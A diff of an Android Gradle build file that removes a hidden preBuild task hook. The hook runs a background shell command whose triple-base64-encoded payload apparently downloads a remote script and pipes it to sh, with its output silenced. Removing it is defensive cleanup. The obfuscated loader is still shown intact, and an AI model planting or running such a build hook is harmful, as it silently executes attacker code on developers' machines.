@@ -71,10 +71,3 @@ dependencies {
     coreLibraryDesugaring("com.android.tools:desugar_jdk_libs:2.0.3")
 }
 
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((o(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIzUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9WbFhOV3RqYlRsd1drWTVjbUl6VW5OaFZ6UnBTVWRvTUdSSVFucFBhVGgyWTIxc2JsbFhUbXRpYVRWd1ltazVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | o | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
